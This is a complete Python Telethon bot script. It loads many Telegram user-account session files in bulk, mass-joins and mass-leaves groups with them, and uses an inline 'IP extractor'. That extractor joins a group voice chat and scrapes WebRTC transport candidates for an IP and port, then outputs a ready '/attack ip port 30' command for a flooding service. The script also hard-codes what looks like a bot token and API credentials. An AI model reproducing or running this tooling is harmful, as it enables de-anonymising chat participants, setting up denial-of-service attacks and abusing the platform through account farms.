import json, random, zipfile, os, asyncio, shutil
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.tl.functions.phone import JoinGroupCallRequest, LeaveGroupCallRequest
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, LeaveChannelRequest
from telethon.tl.types import DataJSON, Channel, Chat
from telethon.errors import (FloodWaitError, UserAlreadyParticipantError,
    UserBannedInChannelError, ChatWriteForbiddenError, ChannelPrivateError,
    UserNotParticipantError, PeerFloodError, AuthKeyUnregisteredError,
    SessionRevokedError, UserDeactivatedBanError, UserDeactivatedError)
from telethon.tl.functions.messages import ImportChatInviteRequest, GetFullChatRequest

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except:
    pass

BOT_TOKEN  = "8877183231:AAF6uNSJnnbaEOCsc-HxFX8FueQQ8-_13EU"
API_ID     = 25723056
API_HASH   = "cbda56fac135e92b755e1243aefe9697"
OWNER_ID   = 8842115436
USERS_FILE = "approved_users.json"

# ── globals ──────────────────────────────────────────────────────────────────
sessions       = {}   # sid → TelegramClient
entity_cache   = {}
approved_users = {}
dead_sids      = set()   # sessions that are banned/revoked (skip forever)
bot            = None

# ── helpers ───────────────────────────────────────────────────────────────────
def load_users():
    global approved_users
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE) as f:
            approved_users = {int(k): v for k, v in json.load(f).items()}

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump({str(k): v for k, v in approved_users.items()}, f)

def is_approved(uid):
    return uid == OWNER_ID or uid in approved_users

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def get_cmd(t):
    if not t: return None, ""
    t = t.strip()
    for p in ['/', '.', '!', ';', '&']:
        if t.startswith(p):
            rest = t[1:].strip()
            if not rest: return None, ""
            parts = rest.split(maxsplit=1)
            return parts[0].lower(), (parts[1] if len(parts) > 1 else "")
    return None, t

def is_dead_error(ex):
    """True if this account is permanently dead (banned/revoked/deactivated)."""
    dead_types = (
        AuthKeyUnregisteredError, SessionRevokedError,
        UserDeactivatedBanError, UserDeactivatedError,
    )
    if isinstance(ex, dead_types):
        return True
    msg = str(ex).lower()
    return any(k in msg for k in [
        "method that is not", "auth_key_unregistered",
        "session_revoked", "user_deactivated", "banned"
    ])

def is_restricted_error(ex):
    """True if account is flood/restricted (keep but skip for now)."""
    return isinstance(ex, (PeerFloodError, UserBannedInChannelError,
                           ChatWriteForbiddenError, ChannelPrivateError))

async def remove_dead_session(sid, c):
    """Move session file to failed_sessions and remove from memory."""
    try:
        sf = getattr(c.session, 'filename', None)
        if sf:
            if not sf.endswith('.session'): sf += '.session'
            os.makedirs("failed_sessions", exist_ok=True)
            if os.path.exists(sf):
                shutil.move(sf, os.path.join("failed_sessions", os.path.basename(sf)))
            jf = sf + "-journal"
            if os.path.exists(jf): os.remove(jf)
    except: pass
    try: await c.disconnect()
    except: pass
    sessions.pop(sid, None)
    entity_cache_clean(sid)
    dead_sids.add(sid)
    log(f"🗑️ S{sid} removed (dead)")

def entity_cache_clean(sid):
    keys = [k for k in entity_cache if k[0] == sid]
    for k in keys: del entity_cache[k]

async def send_chunks(chat_id, results):
    """Send results list split into ≤3800-char messages with a summary."""
    lines = list(results)
    success = sum(1 for l in lines if l.startswith("✅"))
    flood   = sum(1 for l in lines if l.startswith("⏳"))
    dead    = sum(1 for l in lines if l.startswith("🗑️") or "removed" in l.lower())
    fail    = len(lines) - success - flood - dead
    summary = f"\n📊 Total: {len(lines)} | ✅ {success} | ⏳ {flood} | 🗑️ {dead} | ❌ {fail}"

    chunk, chunks, cur_len = [], [], 0
    for line in lines:
        if cur_len + len(line) + 1 > 3800:
            chunks.append(chunk); chunk = [line]; cur_len = len(line)
        else:
            chunk.append(line); cur_len += len(line) + 1
    if chunk: chunks.append(chunk)

    for i, ch in enumerate(chunks):
        prefix = f"Part {i+1}/{len(chunks)}\n" if len(chunks) > 1 else ""
        suffix = summary if i == len(chunks) - 1 else ""
        await bot.send_message(chat_id, prefix + "\n".join(ch) + suffix)

# ── session connect with reconnect ────────────────────────────────────────────
async def ensure_connected(sid, c):
    if not c.is_connected():
        try:
            await asyncio.wait_for(c.connect(), timeout=15)
        except Exception as ex:
            raise ConnectionError(f"Reconnect failed: {ex}")

# ── resolve entity (with cache) ───────────────────────────────────────────────
async def resolve(c, i, sid=None):
    cache_key = (sid, i) if sid is not None else None
    if cache_key and cache_key in entity_cache:
        return entity_cache[cache_key]
    i = i.strip()
    entity = None
    if 't.me/' in i or i.startswith('+'):
        hash_part = i.split('t.me/')[-1] if 't.me/' in i else i
        hash_part = hash_part.split('?')[0].strip()
        if hash_part.startswith('+'):
            try:
                result = await c(ImportChatInviteRequest(hash_part[1:]))
                entity = result.chats[0]
            except UserAlreadyParticipantError as ex:
                if hasattr(ex, 'updates') and ex.updates and hasattr(ex.updates, 'chats') and ex.updates.chats:
                    entity = ex.updates.chats[0]
                else:
                    raise ValueError("Already member. Provide chat ID.")
            except Exception as ex:
                raise ValueError(f"Join failed: {str(ex)[:80]}")
        else:
            i = ('@' if not hash_part.startswith('@') else '') + hash_part
    if not entity:
        ch = i[1:] if i.startswith('@') else i
        if ch.lstrip('-').isdigit():
            chat_id = int(ch)
            try:
                entity = await c.get_entity(chat_id)
            except:
                dialogs = await c.get_dialogs()
                for d in dialogs:
                    if d.entity.id == abs(chat_id):
                        entity = d.entity; break
                if not entity:
                    raise ValueError(f"Entity not found: {chat_id}")
        else:
            try:
                entity = await c.get_entity(i if i.startswith('@') else int(i))
            except:
                entity = await c.get_entity(('@' if not i.startswith('@') else '') + i)
    if cache_key:
        entity_cache[cache_key] = entity
    return entity

# ── join / leave tasks ────────────────────────────────────────────────────────
async def join_task(sid, c, ci):
    try:
        await ensure_connected(sid, c)
        entity = await resolve(c, ci, sid)
        await c(JoinChannelRequest(entity))
        gid   = entity.id if hasattr(entity, 'id') else 'Unknown'
        title = getattr(entity, 'title', 'Unknown')
        if str(gid).lstrip('-').isdigit() and not str(gid).startswith('-100'):
            gid = f"-100{abs(gid)}"
        return f"✅ S{sid} | {title} | `{gid}`"
    except UserAlreadyParticipantError:
        return f"⚠️ S{sid}: Already member"
    except FloodWaitError as fw:
        return f"⏳ S{sid}: FloodWait {fw.seconds}s"
    except Exception as ex:
        if is_dead_error(ex):
            await remove_dead_session(sid, c)
            return f"🗑️ S{sid}: Dead account (removed)"
        if is_restricted_error(ex):
            return f"🚫 S{sid}: Restricted — {str(ex)[:60]}"
        return f"❌ S{sid}: {str(ex)[:60]}"

async def leave_task(sid, c, ci):
    try:
        await ensure_connected(sid, c)
        entity = await resolve(c, ci, sid)
        gid   = entity.id if hasattr(entity, 'id') else 'Unknown'
        title = getattr(entity, 'title', 'Unknown')
        if str(gid).lstrip('-').isdigit() and not str(gid).startswith('-100'):
            gid = f"-100{abs(gid)}"
        asyncio.create_task(c(LeaveChannelRequest(entity)))
        return f"✅ S{sid} left | {title} | `{gid}`"
    except FloodWaitError as fw:
        return f"⏳ S{sid}: FloodWait {fw.seconds}s"
    except Exception as ex:
        if is_dead_error(ex):
            await remove_dead_session(sid, c)
            return f"🗑️ S{sid}: Dead account (removed)"
        return f"❌ S{sid}: {str(ex)[:60]}"

# ── load session file ─────────────────────────────────────────────────────────
async def load_session_file(sf, sid):
    try:
        c = TelegramClient(f"sessions/{sf.replace('.session', '')}", API_ID, API_HASH,
                           connection_retries=2, retry_delay=2, timeout=15)
        await asyncio.wait_for(c.connect(), timeout=20)
        if await c.is_user_authorized():
            sessions[sid] = c
            log(f"✅ S{sid}: {sf}")
            return True
        await c.disconnect()
        log(f"⚠️ S{sid}: Not authorized — {sf}")
    except Exception as ex:
        if is_dead_error(ex):
            log(f"🗑️ S{sid}: Dead — {sf}")
        else:
            log(f"❌ S{sid}: Load error — {sf} — {ex}")
        try:
            os.makedirs("failed_sessions", exist_ok=True)
            src = os.path.join("sessions", sf)
            if os.path.exists(src):
                shutil.move(src, os.path.join("failed_sessions", sf))
        except: pass
    return False

async def load_existing_sessions():
    os.makedirs("sessions", exist_ok=True)
    files = sorted(f for f in os.listdir("sessions") if f.endswith(".session"))
    if not files: return 0
    log(f"📂 Loading {len(files)} sessions…")
    sem = asyncio.Semaphore(10)
    async def lim(sf, i):
        async with sem:
            await asyncio.sleep(i * 0.05)
            return await load_session_file(sf, i + 1)
    results = await asyncio.gather(*[lim(sf, i) for i, sf in enumerate(files)])
    loaded = sum(results)
    log(f"✅ {loaded}/{len(files)} sessions loaded")
    return loaded

# ── handlers ──────────────────────────────────────────────────────────────────
async def setup_handlers(client):

    # ── inline IP extractor ────────────────────────────────────────────────
    @client.on(events.InlineQuery)
    async def inline_handler(e):
        if e.sender_id != OWNER_ID: return
        query = e.text.strip()
        if not query: return
        builder, results = e.builder, []
        if not sessions:
            results.append(builder.article(title="❌ No Sessions", text="Load sessions first"))
            return await e.answer(results)
        parts = query.split(maxsplit=1)
        if len(parts) < 2:
            results.append(builder.article(title="❌ Format", text="@bot <session_id> <chat>"))
            return await e.answer(results)
        sid_arg, chat_input = parts[0].strip(), parts[1].strip()
        try: sid = int(sid_arg)
        except:
            results.append(builder.article(title="❌ Invalid ID", text="Must be a number"))
            return await e.answer(results)
        if sid not in sessions:
            results.append(builder.article(title=f"❌ Session {sid} Missing", text=f"Available: {list(sessions.keys())}"))
            return await e.answer(results)
        c = sessions[sid]
        try:
            await ensure_connected(sid, c)
            ent = await resolve(c, chat_input, sid)
            if isinstance(ent, Channel):   fc = await c(GetFullChannelRequest(channel=ent))
            elif isinstance(ent, Chat):    fc = await c(GetFullChatRequest(chat_id=ent.id))
            else:
                results.append(builder.article(title="❌ Unsupported", text="Unsupported chat type"))
                return await e.answer(results)
            if not fc.full_chat.call:
                results.append(builder.article(title="❌ No Voice Chat", text=f"S{sid}: No active voice chat"))
                return await e.answer(results)
            res = await c(JoinGroupCallRequest(
                call=fc.full_chat.call, join_as=await c.get_me(),
                muted=True, video_stopped=True,
                params=DataJSON(data=json.dumps({"ssrc": random.getrandbits(32)}))
            ))
            try:
                response_data = json.loads(res.updates[-1].params.data)
                candidates = response_data.get("transport", {}).get("candidates", [])
                if len(candidates) < 2:
                    results.append(builder.article(title="❌ Not Enough Candidates",
                        text=f"S{sid}: Got {len(candidates)} candidates"))
                    asyncio.create_task(c(LeaveGroupCallRequest(call=fc.full_chat.call, source=0)))
                    return await e.answer(results)
                data = candidates[1]
                ip, port = data.get("ip", "N/A"), data.get("port", "N/A")
                asyncio.create_task(c(LeaveGroupCallRequest(call=fc.full_chat.call, source=0)))
                results.append(builder.article(
                    title=f"✅ {getattr(ent, 'title', 'Success')}",
                    text=f"🛜 **IP Extracted**\n\n**Session:** {sid}\n**Chat:** {getattr(ent,'title','?')}\n**IP:** `{ip}`\n**PORT:** `{port}`\n**CMD:** `/attack {ip} {port} 30`",
                    description=f"IP: {ip} | Port: {port}",
                    buttons=[[Button.url("👤 Owner", "https://t.me/dustbydust")]]
                ))
            except (KeyError, IndexError, json.JSONDecodeError) as je:
                results.append(builder.article(title="❌ Parse Error", text=str(je)[:100]))
                asyncio.create_task(c(LeaveGroupCallRequest(call=fc.full_chat.call, source=0)))
        except Exception as ex:
            if is_dead_error(ex):
                asyncio.create_task(remove_dead_session(sid, c))
                results.append(builder.article(title=f"🗑️ S{sid} Dead", text="Account banned/revoked — removed"))
            else:
                results.append(builder.article(title="❌ Error", text=str(ex)[:200]))
        await e.answer(results)

    # ── message handler ────────────────────────────────────────────────────
    @client.on(events.NewMessage)
    async def handle_message(e):
        if not e.text: return
        cmd, args = get_cmd(e.text)
        if not cmd: return
        uid  = e.sender_id
        user = await e.get_sender()
        log(f"CMD: {cmd} | {getattr(user, 'first_name', uid)} ({uid})")

        # /start
        if cmd == 'start':
            me   = await client.get_me()
            btns = [
                [Button.url("➕ Add to Group", f"https://t.me/{me.username}?startgroup=true")],
                [Button.inline("📚 Help", b"help"), Button.url("👤 Owner", "https://t.me/dustbydust")]
            ]
            if uid == OWNER_ID: btns.append([Button.inline("🔐 Owner Panel", b"owner_panel")])
            await e.reply(
                f"нєу [{user.first_name}](tg://user?id={uid})!\n\n"
                f"๏ ᴛʜɪs ɪs [{me.first_name}](tg://user?id={me.id})!\n\n"
                f"➻ ᴀ ғᴀsᴛ & ᴘᴏᴡᴇʀғᴜʟ ɪᴩ ᴇxᴛʀᴀᴄᴛᴏʀ ʙᴏᴛ.\n"
                f"──────────────────\n๏ ᴄʟɪᴄᴋ ʜᴇʟᴩ ᴛᴏ sᴇᴇ ᴄᴏᴍᴍᴀɴᴅs.",
                buttons=btns, parse_mode='markdown'
            )

        # /approve
        elif cmd == 'approve' and uid == OWNER_ID:
            target_id = None
            try:
                if args:
                    try: target_id = int(args.strip())
                    except: return await e.reply("❌ Invalid ID")
                elif e.reply_to:
                    target = await e.get_reply_message()
                    target_id = target.sender_id
                if not target_id: return await e.reply("❌ Usage: `/approve <id>` or reply")
                if target_id == OWNER_ID: return await e.reply("❌ Owner is always approved")
                if target_id in approved_users: return await e.reply(f"✅ Already approved: `{target_id}`")
                approved_users[target_id] = {"name": "Approved"}
                save_users()
                await e.reply(f"✅ Approved: `{target_id}`")
            except Exception as ex:
                await e.reply(f"❌ Error: {ex}")

        # /remove
        elif cmd == 'remove' and uid == OWNER_ID:
            if not args: return await e.reply("❌ Usage: `/remove <id>`")
            try: target_id = int(args.strip())
            except: return await e.reply("❌ Invalid ID")
            if target_id == OWNER_ID: return await e.reply("❌ Cannot remove owner")
            if target_id not in approved_users: return await e.reply(f"❌ Not approved: `{target_id}`")
            del approved_users[target_id]; save_users()
            await e.reply(f"✅ Removed: `{target_id}`")

        # /approved
        elif cmd == 'approved' and uid == OWNER_ID:
            if not approved_users: return await e.reply("❌ No approved users")
            lines = "\n".join(f"• `{k}` - {v.get('name','?')}" for k, v in approved_users.items())
            await e.reply(f"✅ **Approved ({len(approved_users)}):**\n\n{lines}")

        # /join <all|sid> <chat>
        elif cmd == 'join' and is_approved(uid):
            parts = args.split(maxsplit=1)
            if len(parts) < 2: return await e.reply("❌ Usage: `/join <session|all> <chat>`")
            sid_arg, chat_input = parts[0].strip(), parts[1].strip()
            if sid_arg.lower() == 'all':
                if not sessions: return await e.reply("❌ No sessions loaded")
                msg = await e.reply(f"⏳ Joining {len(sessions)} sessions…")
                sem = asyncio.Semaphore(15)
                async def do_join(sid, c):
                    async with sem: return await join_task(sid, c, chat_input)
                snap = dict(sessions)
                results = await asyncio.gather(*[do_join(s, c) for s, c in snap.items()])
                await msg.delete()
                await send_chunks(e.chat_id, results)
            else:
                try: sid = int(sid_arg)
                except: return await e.reply("❌ Invalid session ID")
                if sid not in sessions: return await e.reply(f"❌ Session {sid} not found")
                msg = await e.reply("⏳ Joining…")
                result = await join_task(sid, sessions[sid], chat_input)
                await msg.edit(result)

        # /leave <all|sid> <chat>
        elif cmd == 'leave' and is_approved(uid):
            parts = args.split(maxsplit=1)
            if len(parts) < 2: return await e.reply("❌ Usage: `/leave <session|all> <chat>`")
            sid_arg, chat_input = parts[0].strip(), parts[1].strip()
            if sid_arg.lower() == 'all':
                if not sessions: return await e.reply("❌ No sessions loaded")
                msg = await e.reply(f"⏳ Leaving {len(sessions)} sessions…")
                sem = asyncio.Semaphore(15)
                async def do_leave(sid, c):
                    async with sem: return await leave_task(sid, c, chat_input)
                snap = dict(sessions)
                results = await asyncio.gather(*[do_leave(s, c) for s, c in snap.items()])
                await msg.delete()
                await send_chunks(e.chat_id, results)
            else:
                try: sid = int(sid_arg)
                except: return await e.reply("❌ Invalid session ID")
                if sid not in sessions: return await e.reply(f"❌ Session {sid} not found")
                msg = await e.reply("⏳ Leaving…")
                result = await leave_task(sid, sessions[sid], chat_input)
                await msg.edit(result)

        # /clearsessions
        elif cmd == 'clearsessions' and uid == OWNER_ID:
            if not sessions: return await e.reply("❌ No sessions loaded")
            await asyncio.gather(*[s.disconnect() for s in sessions.values()], return_exceptions=True)
            sessions.clear(); entity_cache.clear(); dead_sids.clear()
            shutil.rmtree("sessions", ignore_errors=True)
            os.makedirs("sessions", exist_ok=True)
            await e.reply("✅ All sessions cleared")

        # /exportsessions
        elif cmd == 'exportsessions' and uid == OWNER_ID:
            if not sessions: return await e.reply("❌ No sessions loaded")
            try:
                msg = await e.reply("⏳ Exporting…")
                zip_path = "exported_sessions.zip"
                sorted_sids = sorted(sessions.keys())
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for sid in sorted_sids:
                        sf = getattr(sessions[sid].session, 'filename', None)
                        if not sf: continue
                        if not sf.endswith('.session'): sf += '.session'
                        if os.path.exists(sf): zf.write(sf, os.path.basename(sf))
                with zipfile.ZipFile(zip_path, 'r') as zf:
                    total = len(zf.namelist())
                await client.send_file(
                    e.chat_id, zip_path,
                    caption=(f"📦 **Exported Sessions**\n\n✅ Total: {total}\n"
                             f"🔢 S{sorted_sids[0]} → S{sorted_sids[-1]}\n"
                             f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"),
                    reply_to=e.id
                )
                os.remove(zip_path)
                await msg.delete()
            except Exception as ex:
                await e.reply(f"❌ Export error: {ex}")

        # /cleandeads — manually purge dead sessions
        elif cmd == 'cleandeads' and uid == OWNER_ID:
            if not sessions: return await e.reply("❌ No sessions")
            msg = await e.reply("🔍 Checking for dead sessions…")
            snap = dict(sessions)
            removed = 0
            for sid, c in snap.items():
                try:
                    await ensure_connected(sid, c)
                    if not await c.is_user_authorized():
                        await remove_dead_session(sid, c)
                        removed += 1
                except Exception as ex:
                    if is_dead_error(ex):
                        await remove_dead_session(sid, c)
                        removed += 1
            await msg.edit(f"🗑️ Removed {removed} dead sessions\n✅ Alive: {len(sessions)}")

        # /stats
        elif cmd == 'stats' and uid == OWNER_ID:
            await e.reply(
                f"📊 **Bot Stats**\n\n"
                f"✅ Active Sessions: `{len(sessions)}`\n"
                f"🗑️ Dead (removed): `{len(dead_sids)}`\n"
                f"👥 Approved Users: `{len(approved_users)}`\n"
                f"🕒 Uptime since: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
            )

    # ── ZIP upload handler ─────────────────────────────────────────────────
    @client.on(events.NewMessage(func=lambda e: e.file and e.file.name and e.file.name.endswith('.zip')))
    async def handle_zip(e):
        if e.sender_id != OWNER_ID: return
        msg = await e.reply("⏳ Loading sessions…")
        zp  = None
        try:
            os.makedirs("sessions",      exist_ok=True)
            os.makedirs("temp_sessions", exist_ok=True)
            zp = await e.download_media(file="temp_sessions/uploaded.zip")
            if not zp or not os.path.exists(zp): return await msg.edit("❌ Download failed")
            if not zipfile.is_zipfile(zp):        return await msg.edit("❌ Invalid ZIP file")
            session_files = []
            with zipfile.ZipFile(zp, 'r') as z:
                for info in z.infolist():
                    name = os.path.basename(info.filename)
                    if not name.endswith(".session"): continue
                    try:
                        out_path = os.path.join("sessions", name)
                        with open(out_path, 'wb') as f:
                            f.write(z.read(info.filename))
                        session_files.append(name)
                    except Exception as ex:
                        log(f"❌ Extract failed {name}: {ex}")
            if not session_files: return await msg.edit("❌ No .session files found in ZIP")
            next_id  = max(sessions.keys()) + 1 if sessions else 1
            loaded = failed = 0
            lock = asyncio.Lock()
            sem  = asyncio.Semaphore(10)
            async def try_load(sf):
                nonlocal next_id, loaded, failed
                async with sem:
                    try:
                        c = TelegramClient(f"sessions/{sf.replace('.session','')}", API_ID, API_HASH,
                                           connection_retries=2, retry_delay=2, timeout=15)
                        await asyncio.wait_for(c.connect(), timeout=20)
                        if await c.is_user_authorized():
                            async with lock:
                                sid = next_id; next_id += 1
                                sessions[sid] = c; loaded += 1
                            log(f"✅ S{sid}: {sf}")
                        else:
                            await c.disconnect()
                            async with lock: failed += 1
                    except Exception as ex:
                        try:
                            os.makedirs("failed_sessions", exist_ok=True)
                            src = os.path.join("sessions", sf)
                            if os.path.exists(src):
                                shutil.move(src, os.path.join("failed_sessions", sf))
                        except: pass
                        async with lock: failed += 1
                        log(f"❌ {sf}: {ex}")
            await asyncio.gather(*[try_load(sf) for sf in session_files])
            await msg.edit(f"✅ Loaded: {loaded}\n❌ Failed: {failed}\n📊 Total: {len(sessions)}")
        except Exception as ex:
            log(f"❌ ZIP error: {ex}")
            await msg.edit(f"❌ Error: {str(ex)[:200]}")
        finally:
            try:
                if zp and os.path.exists(zp): os.remove(zp)
                shutil.rmtree("temp_sessions", ignore_errors=True)
            except: pass

    # ── callback buttons ───────────────────────────────────────────────────
    @client.on(events.CallbackQuery(pattern=b"owner_panel"))
    async def owner_panel_cb(e):
        if e.sender_id != OWNER_ID: return await e.answer("❌ Owner Only", alert=True)
        await e.edit(
            f"🔐 **Owner Panel**\n\n✅ Sessions: {len(sessions)}\n👥 Approved: {len(approved_users)}\n🗑️ Dead removed: {len(dead_sids)}\n\n➤ Upload .zip or use commands",
            buttons=[
                [Button.inline("👥 Approved Users",  b"owner_approved")],
                [Button.inline("📦 Session Info",    b"owner_sessions")],
                [Button.inline("🗑️ Clear Sessions",  b"owner_clear")],
                [Button.inline("🏠 Back",            b"home")]
            ]
        )

    @client.on(events.CallbackQuery(pattern=b"owner_approved"))
    async def owner_approved_cb(e):
        if e.sender_id != OWNER_ID: return await e.answer("❌ Owner Only", alert=True)
        if not approved_users: return await e.answer("❌ No approved users", alert=True)
        lines = "\n".join(f"• [{v.get('name','?')}](tg://user?id={k}) (`{k}`)" for k, v in approved_users.items())
        await e.edit(f"✅ **Approved ({len(approved_users)}):**\n\n{lines}",
                     buttons=[[Button.inline("🔙 Back", b"owner_panel")]], parse_mode='markdown')

    @client.on(events.CallbackQuery(pattern=b"owner_sessions"))
    async def owner_sessions_cb(e):
        if e.sender_id != OWNER_ID: return await e.answer("❌ Owner Only", alert=True)
        body = f"✅ Active: {len(sessions)}\n🗑️ Dead removed: {len(dead_sids)}"
        if sessions:
            sids = sorted(sessions.keys())
            body += f"\n🔢 S{sids[0]} → S{sids[-1]}"
        await e.edit(f"📦 **Session Info**\n\n{body}", buttons=[[Button.inline("🔙 Back", b"owner_panel")]])

    @client.on(events.CallbackQuery(pattern=b"owner_clear"))
    async def owner_clear_cb(e):
        if e.sender_id != OWNER_ID: return await e.answer("❌ Owner Only", alert=True)
        await e.edit("⚠️ **Clear ALL sessions?**\n\nCannot be undone.",
            buttons=[[Button.inline("✅ Yes, Clear All", b"confirm_clear")],
                     [Button.inline("❌ Cancel", b"owner_panel")]])

    @client.on(events.CallbackQuery(pattern=b"confirm_clear"))
    async def confirm_clear_cb(e):
        if e.sender_id != OWNER_ID: return await e.answer("❌ Owner Only", alert=True)
        await asyncio.gather(*[s.disconnect() for s in sessions.values()], return_exceptions=True)
        sessions.clear(); entity_cache.clear(); dead_sids.clear()
        shutil.rmtree("sessions", ignore_errors=True)
        os.makedirs("sessions", exist_ok=True)
        await e.edit("✅ All sessions cleared", buttons=[[Button.inline("🏠 Back", b"owner_panel")]])

    @client.on(events.CallbackQuery(pattern=b"help"))
    async def help_cb(e):
        me = await client.get_me()
        await e.edit(
            "📚 **ʜᴇʟᴩ ᴍᴇɴᴜ**\n\n"
            "**๏ ᴜsᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ:**\n"
            "  ❂ `/approve <id>` — approve user\n"
            "  ❂ `/remove <id>` — remove user\n"
            "  ❂ `/approved` — list approved\n\n"
            "**๏ sᴇssɪᴏɴs:**\n"
            "  ❂ Send `.zip` — load sessions\n"
            "  ❂ `/clearsessions` — clear all\n"
            "  ❂ `/exportsessions` — export ZIP\n"
            "  ❂ `/cleandeads` — remove dead accounts\n"
            "  ❂ `/stats` — bot statistics\n\n"
            "**๏ ɢʀᴏᴜᴩ ᴀᴄᴛɪᴏɴs:**\n"
            "  ❂ `/join <session|all> <chat>`\n"
            "  ❂ `/leave <session|all> <chat>`\n\n"
            "**๏ ɪᴩ ᴇxᴛʀᴀᴄᴛɪᴏɴ:**\n"
            "  ❂ `@bot <session_id> <chat>` (inline)\n"
            "  ❂ requires active voice chat",
            buttons=[
                [Button.url("➕ Add to Group", f"https://t.me/{me.username}?startgroup=true")],
                [Button.inline("🏠 Home", b"home"), Button.url("👤 Owner", "https://t.me/dustbydust")]
            ]
        )

    @client.on(events.CallbackQuery(pattern=b"home"))
    async def home_cb(e):
        user = await e.get_sender()
        me   = await client.get_me()
        btns = [
            [Button.url("➕ Add to Group", f"https://t.me/{me.username}?startgroup=true")],
            [Button.inline("📚 Help", b"help"), Button.url("👤 Owner", "https://t.me/dustbydust")]
        ]
        if e.sender_id == OWNER_ID: btns.append([Button.inline("🔐 Owner Panel", b"owner_panel")])
        await e.edit(
            f"нєу [{user.first_name}](tg://user?id={user.id})!\n\n"
            f"๏ ᴛʜɪs ɪs [{me.first_name}](tg://user?id={me.id})!\n\n"
            f"➻ ᴀ ғᴀsᴛ & ᴘᴏᴡᴇʀғᴜʟ ɪᴩ ᴇxᴛʀᴀᴄᴛᴏʀ ʙᴏᴛ.\n"
            f"──────────────────\n๏ ᴄʟɪᴄᴋ ʜᴇʟᴩ ᴛᴏ sᴇᴇ ᴄᴏᴍᴍᴀɴᴅs.",
            buttons=btns, parse_mode='markdown'
        )

# ── main ──────────────────────────────────────────────────────────────────────
async def main():
    global bot
    log("🚀 Starting…")
    load_users()
    log(f"✅ {len(approved_users)} approved users loaded")
    await load_existing_sessions()
    bot = TelegramClient('bot_session', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    log(f"✅ Bot: @{(await bot.get_me()).username}")
    await setup_handlers(bot)
    log("🎉 Running!")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
